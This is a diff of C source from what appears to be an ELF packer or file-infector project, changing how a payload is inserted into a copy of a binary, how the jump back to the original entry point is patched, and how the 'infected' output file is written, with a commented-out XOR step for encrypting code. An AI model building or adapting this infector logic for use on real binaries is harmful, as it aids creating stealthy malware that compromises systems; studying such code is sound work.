@@ -17,23 +17,28 @@ static inline void set_payload(t_elf const *elf)
 {
 	int entry = elf->old_entry - elf->new_entry - PAYLOAD_SIZE;
 
-	memcpy(&payload[JMP_INSERTION], &entry, sizeof(int));
+	_memcpy(&payload[JMP_INSERTION], &entry, sizeof(int));
 }
 
-static void write_on_memory(t_elf const *elf, char *ptr)
+static void write_on_memory(t_elf const *elf, void *ptr, char const *key)
 {
-	memcpy(ptr, elf->ptr, elf->insertion);
-	memset(ptr + elf->insertion, 0, PAYLOAD_SIZE);
-	memcpy(ptr + elf->insertion + PAGE_SIZE, elf->ptr + elf->insertion, (elf->filesize - elf->insertion) + PAGE_SIZE);
+	(void)key;
 
-	memcpy(ptr + elf->insertion, payload, PAYLOAD_SIZE);
+	_memcpy(ptr, elf->ptr, elf->old_offset);
+//	_xorcpy(ptr + elf->old_offset, elf->ptr + elf->old_offset, elf->new_offset - elf->old_offset, key);
+	_memcpy(ptr + elf->old_offset, elf->ptr + elf->old_offset, elf->new_offset - elf->old_offset);
+
+	_memset(ptr + elf->new_offset, 0, PAGE_SIZE);
+	_memcpy(ptr + elf->new_offset + PAGE_SIZE, elf->ptr + elf->new_offset, (elf->filesize - elf->new_offset) + PAGE_SIZE);
+
+	_memcpy(ptr + elf->new_offset, payload, PAYLOAD_SIZE);
 }
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void create_infected(t_elf const *elf)
+void create_infected(t_elf const *elf, char const *key)
 {
 	int fd = 0;
 	char *ptr = NULL;
@@ -41,11 +46,11 @@ void create_infected(t_elf const *elf)
 
 	if ((fd = open(filename, O_RDWR | O_CREAT | O_TRUNC, 0700)) == -1)
 		error(WRONG_FD, filename); 
-	if ((ptr = (char *)mmap(NULL, elf->filesize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+	if ((ptr = mmap(NULL, elf->filesize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 		error(MMAP_FAIL, filename);
 
 	set_payload(elf);
-	write_on_memory(elf, (char *)ptr);
+	write_on_memory(elf, ptr, key);
 	write(fd, ptr, elf->filesize + PAGE_SIZE);
 
 	munmap(ptr, elf->filesize + PAGE_SIZE);
